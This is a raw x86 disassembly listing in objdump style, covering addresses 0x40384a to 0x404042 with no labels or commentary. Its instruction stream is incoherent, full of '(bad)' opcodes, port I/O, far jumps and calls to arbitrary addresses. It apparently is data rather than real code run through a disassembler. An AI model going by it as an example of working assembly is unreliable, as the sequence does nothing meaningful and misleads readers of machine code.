  40384a:	mov    ah,BYTE PTR [ecx-0xe]
  40384d:	out    dx,al
  40384e:	push   esi
  40384f:	adc    bh,ah
  403851:	jnp    0x40389b
  403853:	jl     0x4038d0
  403855:	call   0xbbcfb332
  40385a:	mov    ss,WORD PTR ds:0x1be3d29e
  403860:	call   0xd01cdee9
  403865:	inc    eax
  403866:	jb     0x4038e4
  403868:	loop   0x4037fe
  40386a:	in     al,0x72
  40386c:	fnstcw WORD PTR [ebx]
  40386e:	and    DWORD PTR [esi],0x427ee481
  403874:	mov    eax,ds:0xe199a2c8
  403879:	out    0x68,eax
  40387b:	mov    dh,0x80
  40387d:	in     eax,0xed
  40387f:	pushf  
  403880:	or     DWORD PTR [edi],ecx
  403882:	lods   al,BYTE PTR ds:[esi]
  403883:	sbb    ch,BYTE PTR [ebx]
  403885:	xor    eax,0x4e4eba02
  40388a:	mov    ebp,0xb1431778
  40388f:	fs stc 
  403891:	push   0x14
  403893:	(bad)  
  403894:	popf   
  403895:	cdq    
  403896:	xchg   ebp,eax
  403897:	and    bl,BYTE PTR [eax-0x42de7dfc]
  40389d:	out    dx,eax
  40389e:	add    dh,BYTE PTR [esi]
  4038a0:	pop    ebx
  4038a1:	mov    ebp,0x66e76287
  4038a6:	popf   
  4038a7:	sub    esi,DWORD PTR [edi-0xf216946]
  4038ad:	adc    DWORD PTR [ecx-0x47],ebx
  4038b0:	mov    BYTE PTR [edi-0x6f],ah
  4038b3:	test   al,0x7e
  4038b5:	js     0x403839
  4038b7:	inc    edi
  4038b8:	push   esp
  4038b9:	fadd   st,st(3)
  4038bb:	dec    esp
  4038bc:	cmp    esi,DWORD PTR [edi]
  4038be:	xlat   BYTE PTR ds:[ebx]
  4038bf:	cmc    
  4038c0:	mov    al,BYTE PTR [eax+ecx*1]
  4038c3:	jmp    0x403b62
  4038c8:	into   
  4038c9:	rol    esi,cl
  4038cb:	ror    ecx,0xd9
  4038ce:	(bad)  
  4038d0:	mov    ebp,0x5d405f3
  4038d5:	lahf   
  4038d6:	aas    
  4038d7:	imul   edx,DWORD PTR [ebx*1+0x7efe7878],0x6ead7878
  4038e2:	jmp    0x403881
  4038e4:	and    DWORD PTR [ecx-0x7dede58d],edx
  4038ea:	xchg   dh,dh
  4038ec:	inc    edi
  4038ed:	cdq    
  4038ee:	sub    ah,BYTE PTR [ebx+0x6a94d2b7]
  4038f4:	stc    
  4038f5:	xchg   edx,eax
  4038f6:	jne    0x40393a
  4038f8:	sbb    al,0x16
  4038fa:	sub    eax,DWORD PTR [ebp+0x974cce5]
  403900:	icebp  
  403901:	mov    al,ds:0x918d0fb3
  403906:	mul    dh
  403908:	sbb    ebx,DWORD PTR [eax]
  40390a:	and    DWORD PTR [eax+ebp*4-0x491712eb],eax
  403911:	repnz sahf 
  403913:	call   0x4166:0xb53a8de5
  40391a:	xor    ch,BYTE PTR [edi+0x4d]
  40391d:	call   0xdca641de
  403922:	lea    esi,[ecx]
  403924:	mov    ah,0xc4
  403926:	and    DWORD PTR [eax],esp
  403928:	sahf   
  403929:	jecxz  0x40393f
  40392b:	pop    edx
  40392c:	aad    0x32
  40392e:	lods   eax,DWORD PTR ds:[esi]
  40392f:	inc    eax
  403930:	in     al,dx
  403931:	push   esp
  403932:	bnd jge 0x4039b4
  403935:	je     0x403942
  403937:	out    0xe4,eax
  403939:	icebp  
  40393a:	js     0x403998
  40393c:	pop    edi
  40393d:	push   0xffffffac
  40393f:	dec    ebx
  403940:	aaa    
  403941:	pop    esi
  403942:	mov    ss,WORD PTR [ebx+0x344f04d0]
  403948:	ins    BYTE PTR es:[edi],dx
  403949:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40394a:	sub    eax,0xc64cea7e
  40394f:	mov    al,ds:0xfec918a7
  403954:	mov    DWORD PTR [ecx-0x71e75fe0],esi
  40395a:	loopne 0x4039a4
  40395c:	mov    edx,DWORD PTR [edx+esi*4]
  40395f:	xor    al,0xb3
  403961:	xor    eax,0xf51754a5
  403966:	mov    DWORD PTR [edi],ecx
  403968:	das    
  403969:	in     eax,dx
  40396a:	sbb    BYTE PTR [ecx],bh
  40396c:	cs imul ecx,DWORD PTR es:[ecx+eax*2+0x20],0xffffffec
  403973:	dec    ebp
  403974:	xor    al,0x49
  403976:	mov    ecx,0x77da021f
  40397b:	inc    esi
  40397c:	sar    BYTE PTR [eax],cl
  40397e:	mov    ah,0x18
  403980:	aas    
  403981:	mov    DWORD PTR [ecx-0x4de27550],eax
  403987:	je     0x4039a8
  403989:	sub    dh,ch
  40398b:	enter  0x62,0x5d
  40398f:	enter  0xc666,0x1a
  403993:	mov    edi,0x567ddce0
  403998:	std    
  403999:	mov    cl,0xc2
  40399b:	xchg   edi,eax
  40399c:	fild   QWORD PTR [edi+0x4c111bf6]
  4039a2:	leave  
  4039a3:	(bad)  
  4039a5:	push   0x5a23cd27
  4039aa:	outs   dx,DWORD PTR ds:[esi]
  4039ab:	sar    ebp,cl
  4039ad:	add    esi,ecx
  4039af:	and    eax,ecx
  4039b1:	jmp    0xe60508de
  4039b6:	xchg   ecx,eax
  4039b7:	sub    eax,0x7740a0ba
  4039bc:	cs (bad) 
  4039be:	(bad)  
  4039bf:	adc    DWORD PTR gs:[ebx],esi
  4039c2:	fnstsw WORD PTR [edx+edx*1+0x71]
  4039c6:	or     BYTE PTR [edi],bl
  4039c8:	jg     0x40397b
  4039ca:	xchg   ebx,eax
  4039cb:	or     dh,BYTE PTR [ecx]
  4039cd:	fstp   DWORD PTR [ebx]
  4039cf:	cmp    BYTE PTR [ebx+0x30b1efcd],0x42
  4039d6:	je     0x403a0b
  4039d8:	mov    ebx,0x47c3300a
  4039dd:	adc    ebx,DWORD PTR [ecx+0x5394ade1]
  4039e3:	ins    DWORD PTR es:[edi],dx
  4039e4:	push   ss
  4039e5:	stos   DWORD PTR es:[edi],eax
  4039e6:	shl    BYTE PTR [ebx-0x53f36a57],1
  4039ec:	xor    ch,0x91
  4039ef:	sub    bl,cl
  4039f1:	xchg   dl,ah
  4039f3:	cmp    eax,0x2946d35
  4039f8:	mov    ebp,ecx
  4039fa:	mov    ?,ecx
  4039fc:	aaa    
  4039fd:	pushf  
  4039fe:	call   0x53f9:0xee7ebf2f
  403a05:	cmp    al,0x38
  403a07:	into   
  403a08:	ret    0x8d2f
  403a0b:	xor    cl,BYTE PTR cs:[ebp+ecx*1+0x4a]
  403a10:	add    al,0xee
  403a12:	stos   BYTE PTR es:[edi],al
  403a13:	lods   al,BYTE PTR ds:[esi]
  403a14:	(bad)  
  403a15:	and    al,BYTE PTR [edx+0x1e]
  403a18:	pop    es
  403a19:	and    dh,al
  403a1b:	loop   0x403a0b
  403a1d:	fstp   DWORD PTR [eax]
  403a1f:	jmp    0xed33:0xb9afc247
  403a26:	pop    ebx
  403a27:	inc    ecx
  403a28:	nop
  403a29:	push   ebx
  403a2a:	inc    edx
  403a2b:	je     0x403a3a
  403a2d:	pushf  
  403a2e:	sub    eax,0xdd3c782c
  403a33:	je     0x4039c7
  403a35:	or     BYTE PTR [bp+di-0x2d],al
  403a39:	mov    ecx,edx
  403a3b:	shr    DWORD PTR [ebp*2-0x7aafbffc],cl
  403a42:	dec    edi
  403a44:	loop   0x4039e7
  403a46:	jle    0x403abd
  403a48:	inc    esi
  403a49:	aas    
  403a4a:	adc    eax,0x63c3afad
  403a4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a50:	imul   edi,DWORD PTR [esi+0x72569e68],0xffffff9d
  403a57:	sbb    ah,BYTE PTR [eax-0x747f8906]
  403a5d:	cmp    edx,0x7449505a
  403a63:	sahf   
  403a64:	aam    0x45
  403a66:	cmp    esi,DWORD PTR [edi-0x73]
  403a69:	mov    edi,0x3a983c23
  403a6e:	pop    ebx
  403a6f:	pusha  
  403a70:	add    DWORD PTR [edx+eax*8+0x72],edi
  403a74:	sub    BYTE PTR ds:[eax],bh
  403a77:	idiv   DWORD PTR [ecx+esi*2]
  403a7a:	sbb    DWORD PTR [edi+0x4a],0x6e
  403a7e:	adc    eax,0xf884fff
  403a83:	jns    0x403ae0
  403a85:	and    al,0xa4
  403a87:	popf   
  403a88:	mov    ?,esi
  403a8a:	mov    cl,0x95
  403a8c:	push   es
  403a8d:	stc    
  403a8e:	ror    BYTE PTR [ecx+0xd],1
  403a91:	jle    0x403a8f
  403a93:	mov    eax,0xbeeea680
  403a98:	ins    BYTE PTR es:[edi],dx
  403a99:	stos   BYTE PTR es:[edi],al
  403a9a:	dec    esp
  403a9b:	bound  ebx,QWORD PTR ds:0x54daea4
  403aa1:	pop    ebp
  403aa2:	addps  xmm3,XMMWORD PTR [edi+0x58cf7b37]
  403aa9:	push   ebx
  403aaa:	xor    al,0x9a
  403aac:	jo     0x403a42
  403aae:	shr    DWORD PTR [ecx+0x52],0x4d
  403ab2:	push   0x6697590c
  403ab7:	mov    ah,0x83
  403ab9:	adc    esp,DWORD PTR ds:0x2c25f8b
  403abf:	add    eax,DWORD PTR [eax]
  403ac1:	pop    ecx
  403ac2:	add    cl,BYTE PTR [eax+0x2]
  403ac5:	fist   DWORD PTR [edx]
  403ac7:	int3   
  403ac8:	xor    ebp,ebp
  403aca:	out    dx,al
  403acb:	mov    dh,0x95
  403acd:	jecxz  0x403b45
  403acf:	fistp  WORD PTR [ebx-0x69]
  403ad2:	(bad)  
  403ad3:	add    bh,BYTE PTR [edx-0x6a609c78]
  403ad9:	aaa    
  403ada:	pop    es
  403adb:	mov    edx,0x6ab4db70
  403ae0:	add    DWORD PTR [ebx-0x1d],0xfffffff0
  403ae4:	sbb    dl,dh
  403ae6:	cld    
  403ae7:	bound  esi,QWORD PTR [ebp+0x76]
  403aea:	aaa    
  403aeb:	inc    eax
  403aec:	and    BYTE PTR ds:0xf372ab9e,0x18
  403af3:	outs   dx,DWORD PTR ds:[esi]
  403af4:	je     0x403b20
  403af6:	push   esp
  403af7:	cmp    eax,0x85ced596
  403afc:	mov    edx,0x6edb8bc0
  403b01:	cmp    eax,0xbfa689ef
  403b06:	ds mov dl,0x89
  403b09:	shr    dl,cl
  403b0b:	adc    bh,bh
  403b0d:	xchg   edx,eax
  403b0e:	popw   es
  403b10:	loopne 0x403b69
  403b12:	lods   eax,DWORD PTR ds:[esi]
  403b13:	push   es
  403b14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b15:	ffree  st(0)
  403b17:	adc    al,0x7a
  403b19:	cmp    DWORD PTR [eax],0x11
  403b1c:	xor    eax,0xd665435a
  403b21:	out    0x2d,eax
  403b23:	mov    DWORD PTR [eax-0x53],0x8aa98702
  403b2a:	cmc    
  403b2b:	nop
  403b2c:	fdivr  QWORD PTR [edi+ecx*2-0x64ca1340]
  403b33:	int3   
  403b34:	cdq    
  403b35:	pop    ecx
  403b36:	inc    eax
  403b37:	push   es
  403b38:	mov    edx,0x32ef7666
  403b3d:	cmp    BYTE PTR [edx-0x67],0xd2
  403b41:	lock or DWORD PTR [edx],edi
  403b44:	mov    edx,0xb7706e57
  403b49:	ins    DWORD PTR es:[edi],dx
  403b4a:	push   edx
  403b4b:	aaa    
  403b4c:	inc    edi
  403b4d:	out    dx,eax
  403b4e:	inc    edx
  403b4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b50:	repnz mov bl,0x91
  403b53:	add    al,0xd2
  403b55:	lods   eax,DWORD PTR ds:[esi]
  403b56:	std    
  403b57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b58:	dec    esi
  403b59:	popf   
  403b5a:	or     eax,0x8568467b
  403b5f:	out    0xd7,al
  403b61:	lahf   
  403b62:	add    al,0x3b
  403b64:	xor    al,0x43
  403b66:	cmp    al,0xc5
  403b68:	je     0x4040bd
  403b6e:	jmp    0x403e0d
  403b73:	leave  
  403b74:	rol    dl,cl
  403b76:	rcr    ecx,cl
  403b78:	rcr    ecx,cl
  403b7a:	(bad)  
  403b7c:	ss push edx
  403b7e:	fwait
  403b7f:	jo     0x403b3e
  403b81:	or     DWORD PTR [ecx+0x7878239a],ebp
  403b87:	(bad)  
  403b88:	jle    0x403c02
  403b8a:	js     0x403b87
  403b8c:	mov    BYTE PTR [ebp+0x59d451f9],bl
  403b92:	inc    edi
  403b93:	push   esp
  403b95:	loopne 0x403b28
  403b97:	sbb    al,bl
  403b99:	cmc    
  403b9a:	lods   al,BYTE PTR ds:[esi]
  403b9b:	mov    BYTE PTR [esi],al
  403b9d:	fs push ecx
  403b9f:	pop    ds
  403ba0:	jbe    0x403c10
  403ba2:	sbb    BYTE PTR [edx+0x68cf1ca7],bh
  403ba8:	sub    esi,ebp
  403baa:	ja     0x403b5f
  403bac:	mov    ah,0xf2
  403bae:	aas    
  403baf:	clc    
  403bb0:	mov    eax,0x1ae1c1ec
  403bb5:	aaa    
  403bb6:	mov    dl,0x7f
  403bb8:	push   edi
  403bb9:	or     al,BYTE PTR [eax+eiz*8+0x6515cad9]
  403bc0:	arpl   WORD PTR [esi-0x3e6ac8bb],bx
  403bc6:	addr16 fcomi st,st(7)
  403bc9:	sahf   
  403bca:	test   WORD PTR [ecx-0x3a],cx
  403bce:	aad    0xc
  403bd0:	scas   al,BYTE PTR es:[edi]
  403bd1:	sub    al,0xc8
  403bd3:	gs jb  0x403b7c
  403bd6:	and    esi,DWORD PTR [ebx+ebx*2-0x14b8f681]
  403bdd:	or     bh,BYTE PTR [ecx]
  403bdf:	je     0x403be5
  403be1:	lds    edx,FWORD PTR [ecx+0x13134d8c]
  403be7:	push   edi
  403be8:	(bad)  
  403be9:	xlat   BYTE PTR ds:[ebx]
  403bea:	pop    eax
  403beb:	jo     0x403b8d
  403bed:	pop    esp
  403bee:	xchg   BYTE PTR [esi-0x4393d73e],cl
  403bf4:	iret   
  403bf5:	jle    0x403c4d
  403bf7:	shr    BYTE PTR [ecx-0x102d13f2],0x91
  403bfe:	mov    cl,0x5c
  403c00:	xor    edi,ecx
  403c02:	(bad)  
  403c03:	dec    edi
  403c04:	sub    ebp,esi
  403c06:	sub    dh,BYTE PTR [esi]
  403c08:	fisttp WORD PTR [ebp+0x16a26b96]
  403c0e:	ins    DWORD PTR es:[edi],dx
  403c0f:	mov    ch,0x56
  403c11:	sbb    cl,ch
  403c13:	dec    eax
  403c14:	mov    edx,DWORD PTR [ecx]
  403c16:	xor    ebx,eax
  403c18:	ror    DWORD PTR [esi+0x60],cl
  403c1b:	cmp    DWORD PTR [ebp+edi*2+0x61640825],0xfffffff3
  403c23:	or     BYTE PTR [edx+0x41],bl
  403c26:	aaa    
  403c27:	sbb    eax,0x46c37ca5
  403c2c:	(bad)  
  403c2d:	or     edi,DWORD PTR ds:0x513a7eea
  403c33:	and    eax,0x22d8b98f
  403c38:	and    BYTE PTR [edx+0x68],dl
  403c3b:	jmp    0xb5ec:0xac0f5cab
  403c42:	jmp    0x403cc1
  403c44:	mov    ch,0xb9
  403c46:	nop
  403c47:	ds int3 
  403c49:	jmp    0x403bfb
  403c4b:	repz pop ds
  403c4d:	(bad)  
  403c4e:	out    0x8d,al
  403c50:	loope  0x403c6d
  403c52:	lahf   
  403c53:	pop    eax
  403c54:	mov    ch,0x1f
  403c56:	jno    0x403caf
  403c58:	jo     0x403c06
  403c5a:	mov    edi,0x5b447485
  403c5f:	add    ebx,DWORD PTR [edi-0x681c1fe3]
  403c65:	pop    edx
  403c66:	sbb    ah,cl
  403c68:	or     ebp,ebp
  403c6a:	xor    BYTE PTR [ebp-0x21e551cd],al
  403c70:	data16 je 0x403c44
  403c73:	mov    ch,0xed
  403c75:	out    dx,eax
  403c76:	inc    esi
  403c77:	popf   
  403c78:	fidiv  WORD PTR [edi]
  403c7a:	pop    edi
  403c7b:	sbb    bl,BYTE PTR [ebx]
  403c7d:	adc    bh,dh
  403c7f:	pusha  
  403c80:	add    eax,0xec2cf20c
  403c85:	retf   
  403c86:	fisttp QWORD PTR [ecx-0x6c8a04e9]
  403c8c:	fisttp DWORD PTR [esi-0x39]
  403c8f:	mov    dl,cl
  403c91:	cmp    al,0x30
  403c93:	pop    ds
  403c94:	or     bh,ah
  403c96:	add    DWORD PTR [edx-0x21ad86fb],edx
  403c9c:	int    0xa1
  403c9e:	jp     0x403cad
  403ca0:	pop    edx
  403ca1:	icebp  
  403ca2:	imul   esp,ebp,0x31
  403ca5:	jb     0x403ca8
  403ca7:	and    edi,DWORD PTR [ebp+0x6b]
  403caa:	and    DWORD PTR [ecx-0x57],ecx
  403cad:	mov    ds:0x266719c4,eax
  403cb2:	in     eax,0x5a
  403cb4:	jbe    0x403ccc
  403cb6:	es dec al
  403cb9:	push   ebx
  403cba:	sbb    al,0x70
  403cbc:	pop    ds
  403cbd:	sbb    BYTE PTR [ebx],0x9c
  403cc0:	frstor [eax+edx*1+0x66]
  403cc4:	or     al,0xe4
  403cc6:	stc    
  403cc7:	imul   ebp,DWORD PTR [ecx],0xde41e1e7
  403ccd:	or     al,0x44
  403ccf:	add    ebx,DWORD PTR [ebp-0x25]
  403cd2:	cwde   
  403cd3:	test   eax,esi
  403cd5:	sti    
  403cd6:	cli    
  403cd7:	jno    0x403c5b
  403cd9:	and    BYTE PTR [edx],ch
  403cdb:	mov    edx,0x5bf3833f
  403ce0:	mov    bh,BYTE PTR [eax+edx*8+0x1e7372c8]
  403ce7:	push   0x24ca259b
  403cec:	test   BYTE PTR [ecx-0x56],bl
  403cef:	cmp    BYTE PTR [ebx],ah
  403cf1:	add    ebx,DWORD PTR [edi-0x37be4892]
  403cf7:	frstor [eax]
  403cf9:	jnp    0x403d54
  403cfb:	sub    al,0x41
  403cfd:	push   ebx
  403cfe:	sub    bl,BYTE PTR [eax+edi*2-0x1c]
  403d02:	jmp    0xd828:0x58e1203
  403d09:	jno    0x403d05
  403d0b:	pop    ss
  403d0c:	mov    ebx,0x4f251559
  403d11:	les    esi,FWORD PTR [eax+0x20]
  403d14:	stc    
  403d15:	aaa    
  403d16:	dec    eax
  403d17:	inc    ebp
  403d18:	jns    0x403cbd
  403d1a:	adc    bh,BYTE PTR [edx+0x7133e7fc]
  403d20:	jno    0x403d01
  403d22:	fwait
  403d23:	out    dx,al
  403d24:	and    ebx,DWORD PTR [eax]
  403d26:	aam    0xd5
  403d28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d29:	push   ecx
  403d2a:	jmp    0x3c4c:0x4b305a9f
  403d31:	add    edx,DWORD PTR [ebx]
  403d33:	push   esp
  403d34:	cmp    eax,0x9da992ed
  403d39:	pop    esp
  403d3a:	lods   al,BYTE PTR ds:[esi]
  403d3b:	xrelease xchg DWORD PTR [ebp+0x1c],ebp
  403d3f:	mov    ah,0x73
  403d41:	loopne 0x403d11
  403d43:	mov    ds:0xe45293ba,al
  403d48:	mov    ds:0xf18a7d06,al
  403d4d:	iret   
  403d4e:	fwait
  403d4f:	xor    bl,BYTE PTR [esi-0x736ab3c6]
  403d55:	das    
  403d56:	loop   0x403d06
  403d58:	and    eax,0x91bf5efd
  403d5d:	mov    dh,0x7
  403d5f:	inc    esi
  403d60:	enter  0xa49,0x69
  403d64:	aaa    
  403d65:	pop    esi
  403d66:	(bad)  [edx+eax*1-0x41478b93]
  403d6d:	add    eax,0x8e9bd060
  403d72:	and    ah,ah
  403d74:	and    eax,0x10009e3c
  403d79:	add    BYTE PTR [ecx],ch
  403d7b:	pop    ebp
  403d7c:	cmovbe esi,DWORD PTR [eax+0xf]
  403d80:	popa   
  403d81:	adc    eax,0xe5496da2
  403d86:	or     al,0x3b
  403d88:	popa   
  403d89:	push   ds
  403d8a:	cmc    
  403d8b:	adc    ch,ch
  403d8d:	inc    edi
  403d8e:	mov    dh,0x53
  403d90:	out    0x58,al
  403d92:	pop    esi
  403d93:	mov    edi,0x9863f229
  403d98:	lods   al,BYTE PTR ds:[esi]
  403d99:	xchg   esp,eax
  403d9a:	or     DWORD PTR [ebp+0x6669ca16],0x8243e3c1
  403da4:	inc    eax
  403da5:	push   ss
  403da6:	sbb    ebp,DWORD PTR [esi]
  403da8:	nop
  403da9:	xor    eax,0xef044988
  403dae:	fstp   st(7)
  403db0:	sub    BYTE PTR [ecx],dh
  403db2:	neg    ebx
  403db4:	xchg   DWORD PTR [esi+0x597c0533],eax
  403dba:	cmp    eax,DWORD PTR [eax]
  403dbc:	div    DWORD PTR [ebp-0x3c675cdf]
  403dc2:	loopne 0x403d73
  403dc4:	test   al,0xd
  403dc6:	test   BYTE PTR [ecx-0x64],al
  403dc9:	xchg   DWORD PTR [edx+0x18],esi
  403dcc:	mov    DWORD PTR [esi+0x757d4828],edi
  403dd2:	sahf   
  403dd3:	retf   0xbe3a
  403dd6:	inc    edi
  403dd7:	jb     0x403dcc
  403dd9:	push   ebx
  403dda:	js     0x403d94
  403ddc:	jbe    0x403df4
  403dde:	in     al,dx
  403ddf:	sub    ebp,DWORD PTR [esi-0x33]
  403de2:	test   eax,0x69bba08f
  403de7:	dec    edi
  403de8:	and    BYTE PTR [edx],dl
  403dea:	ins    DWORD PTR es:[edi],dx
  403deb:	push   0xf9f3b69a
  403df0:	je     0x403e5e
  403df2:	xchg   ch,ah
  403df4:	or     BYTE PTR ds:0xb4e29671,ah
  403dfa:	fucomi st,st(2)
  403dfc:	inc    esi
  403dfd:	(bad)  
  403dfe:	adc    al,0xe7
  403e00:	in     al,0x44
  403e02:	(bad)  
  403e03:	mov    esp,0xa6109fe2
  403e08:	ins    BYTE PTR es:[edi],dx
  403e09:	mov    edx,0x8b74330b
  403e0e:	inc    ebp
  403e0f:	or     BYTE PTR [ebx-0x39cc07b3],cl
  403e15:	add    eax,edi
  403e17:	mov    DWORD PTR [ecx],eax
  403e19:	jmp    0x404380
  403e1e:	jmp    0x4040bd
  403e23:	ds retf 0xcdca
  403e27:	retf   0xd9cd
  403e2a:	fldenv ds:0x69dd8593
  403e30:	lahf   
  403e31:	and    DWORD PTR [esi+0x18],ebx
  403e34:	and    BYTE PTR [eax+0x78],bh
  403e37:	(bad)  
  403e38:	jle    0x403eb2
  403e3a:	js     0x403e03
  403e3c:	aam    0xe9
  403e3e:	stos   DWORD PTR es:[edi],eax
  403e3f:	inc    ebx
  403e40:	mov    dh,BYTE PTR [ebp+0x6f717248]
  403e46:	fs test eax,0x5f8f7768
  403e4c:	adc    DWORD PTR [ebx-0x4721d7e6],edx
  403e52:	or     al,0x2b
  403e54:	ins    BYTE PTR es:[edi],dx
  403e55:	inc    ebx
  403e56:	fcomip st,st(6)
  403e58:	rol    DWORD PTR [edi],1
  403e5a:	pop    ecx
  403e5b:	cmp    ebp,esi
  403e5d:	jb     0x403e82
  403e5f:	jno    0x403e4f
  403e61:	daa    
  403e62:	xchg   ebp,eax
  403e63:	jp     0x403ea9
  403e65:	retf   
  403e66:	xchg   ebp,eax
  403e67:	pop    ecx
  403e68:	mov    bh,0xd7
  403e6a:	sub    BYTE PTR [eax+0x1269e65b],0x84
  403e71:	std    
  403e72:	cmp    edi,DWORD PTR [ecx-0x4d]
  403e75:	or     al,BYTE PTR [edx-0x2b]
  403e78:	inc    eax
  403e79:	inc    edi
  403e7a:	fcom   DWORD PTR [ecx-0x49a8c8e4]
  403e80:	stos   BYTE PTR es:[edi],al
  403e81:	rcl    DWORD PTR gs:[eax],1
  403e84:	pop    esi
  403e85:	out    0x66,eax
  403e87:	pop    edi
  403e88:	push   edi
  403e89:	loop   0x403ea3
  403e8b:	les    edx,FWORD PTR [eax]
  403e8d:	mov    esp,0xba404e7c
  403e92:	cmp    eax,0x36c7263b
  403e97:	sub    ecx,esp
  403e99:	xchg   esp,eax
  403e9a:	dec    ecx
  403e9b:	mov    DWORD PTR [ebp+0x3e],esp
  403e9e:	jbe    0x403e90
  403ea0:	retf   0x92ad
  403ea3:	pop    ecx
  403ea5:	lods   al,BYTE PTR ds:[esi]
  403ea6:	xor    BYTE PTR [edx+0x3c],ch
  403ea9:	hlt    
  403eaa:	(bad)  
  403eab:	int    0x81
  403ead:	pop    ebp
  403eae:	inc    ecx
  403eaf:	in     al,dx
  403eb0:	pusha  
  403eb1:	lds    esp,FWORD PTR [ecx-0x75]
  403eb4:	outs   dx,DWORD PTR ds:[esi]
  403eb5:	ja     0x403f17
  403eb7:	mov    BYTE PTR [esp+0x7ebe5a22],dl
  403ebe:	nop
  403ebf:	pop    eax
  403ec0:	pop    es
  403ec1:	call   0xa157bbb5
  403ec6:	mov    cl,0xd0
  403ec8:	dec    ebx
  403ec9:	and    BYTE PTR [ebx],dl
  403ecb:	push   ecx
  403ecc:	inc    ebp
  403ecd:	push   0x93856198
  403ed2:	je     0x403ed2
  403ed4:	xor    DWORD PTR [ebx-0x33a392],edi
  403eda:	test   DWORD PTR [edi],ecx
  403edc:	push   0x7d
  403ede:	dec    ebp
  403edf:	daa    
  403ee0:	jecxz  0x403eb8
  403ee2:	cmp    al,0xcc
  403ee4:	(bad)  
  403ee6:	add    BYTE PTR [edi+0x63de78e4],dl
  403eec:	jmp    0x446e:0x90e041e4
  403ef3:	push   edi
  403ef4:	push   edx
  403ef5:	sbb    BYTE PTR [edx+0xde6e994],cl
  403efb:	inc    ecx
  403efc:	and    eax,0xcfc3474d
  403f01:	cmp    al,0x18
  403f03:	mov    dh,0xa4
  403f05:	cdq    
  403f06:	arpl   WORD PTR [ebp+0x6e],sp
  403f09:	adc    DWORD PTR [ebx-0x4948d1a3],ebx
  403f0f:	pop    ss
  403f10:	jo     0x403ed1
  403f12:	mov    WORD PTR [ebx-0x7209284f],ds
  403f18:	mov    ebx,0x9648237a
  403f1d:	imul   edi,DWORD PTR [ecx+0x1],0xffffffed
  403f21:	mov    edi,?
  403f23:	int    0x5b
  403f25:	repz mov al,0x94
  403f28:	icebp  
  403f29:	mov    al,ds:0x2ec19525
  403f2e:	add    eax,0x31fad8ec
  403f33:	icebp  
  403f34:	pop    esi
  403f35:	sub    BYTE PTR [edx],cl
  403f37:	add    DWORD PTR [eax],ecx
  403f39:	cmp    eax,0x6e53e0f1
  403f3e:	adc    dh,al
  403f40:	cdq    
  403f41:	ffreep st(5)
  403f43:	loope  0x403ef8
  403f45:	int    0xd1
  403f47:	or     al,0x2e
  403f49:	and    al,0x48
  403f4b:	stos   DWORD PTR es:[edi],eax
  403f4c:	and    ah,BYTE PTR [esi+0x55]
  403f4f:	add    dl,BYTE PTR [edi-0x1e089a84]
  403f55:	test   eax,0x43957923
  403f5a:	cdq    
  403f5b:	push   edi
  403f5c:	pop    ebx
  403f5d:	jae    0x403f5c
  403f5f:	adc    eax,0xce80412
  403f64:	mov    ebp,DWORD PTR [esi+eiz*1]
  403f67:	(bad)  
  403f68:	jns    0x403f2f
  403f6a:	ss out 0x47,al
  403f6d:	call   0x906d7aed
  403f72:	clc    
  403f73:	daa    
  403f74:	mov    dh,0x6d
  403f76:	cmp    bl,BYTE PTR [ebp+0x71001eb4]
  403f7c:	sub    eax,0xcee27d47
  403f81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f82:	jmp    0x54a7f87c
  403f87:	mov    al,ds:0xcb09bf10
  403f8c:	inc    edi
  403f8d:	xchg   ebx,eax
  403f8e:	xor    ebx,edx
  403f90:	jl     0x403fa2
  403f92:	popa   
  403f93:	sbb    ecx,edi
  403f95:	cmp    BYTE PTR [ebx-0x5d95619c],bl
  403f9b:	xchg   ebx,eax
  403f9c:	mov    al,0x84
  403f9e:	daa    
  403f9f:	mov    ch,dl
  403fa1:	sub    DWORD PTR [ebx],eax
  403fa3:	push   ebx
  403fa4:	call   0xe9978e01
  403fa9:	cmp    DWORD PTR [esi],esi
  403fab:	outs   dx,BYTE PTR ds:[esi]
  403fac:	pusha  
  403fad:	popf   
  403fae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403faf:	mov    ebx,0x69d66695
  403fb4:	dec    ecx
  403fb5:	je     0x403fb7
  403fb7:	mov    eax,0x4c7fe516
  403fbc:	clc    
  403fbd:	mov    ch,0x75
  403fbf:	(bad)  
  403fc3:	outs   dx,BYTE PTR ds:[esi]
  403fc4:	push   cs
  403fc5:	sub    edi,ebx
  403fc7:	xchg   edi,eax
  403fc8:	ins    DWORD PTR es:[edi],dx
  403fc9:	mov    dl,0x9e
  403fcb:	(bad)  
  403fcc:	ficomp DWORD PTR [ebp+0xd41bc1c]
  403fd2:	test   DWORD PTR [ebx+0x6ef955b2],0x97cc450d
  403fdc:	push   cs
  403fdd:	sub    eax,0x26bdb794
  403fe2:	sub    bh,dh
  403fe4:	ret    0x4ab0
  403fe7:	and    DWORD PTR [ecx+0x19314f16],eax
  403fed:	and    eax,0x2a43b54a
  403ff2:	ret    
  403ff3:	mov    esp,0x1db1eda4
  403ff8:	sub    bh,dl
  403ffa:	push   ds
  403ffb:	loop   0x403fa6
  403ffd:	ss push esi
  403fff:	mov    dh,0x3c
  404001:	fisub  DWORD PTR [ebx-0xaa1c53f]
  404007:	mov    ebp,0x11526400
  40400c:	xchg   ecx,eax
  40400d:	sub    al,0xa4
  40400f:	pop    eax
  404010:	shl    BYTE PTR [edx-0x67],1
  404013:	cmp    BYTE PTR [ebx+eiz*2],al
  404016:	imul   esp,eax,0x900d8281
  40401c:	sbb    ch,ah
  40401e:	inc    edx
  40401f:	or     BYTE PTR [ecx+ebp*2+0x58b531e1],ah
  404026:	aam    0x70
  404028:	pop    ss
  404029:	add    al,0x73
  40402b:	fstp   QWORD PTR [edx+0x2d]
  40402e:	repz dec ecx
  404030:	mov    eax,0x668ab835
  404035:	or     DWORD PTR [ebx],0x22
  404038:	pusha  
  404039:	jno    0x40409b
  40403b:	in     eax,dx
  40403c:	cmp    BYTE PTR [edi],ch
  40403e:	loopne 0x404050
  404040:	push   es
  404041:	inc    edi
  404042:	jp     0x40408d
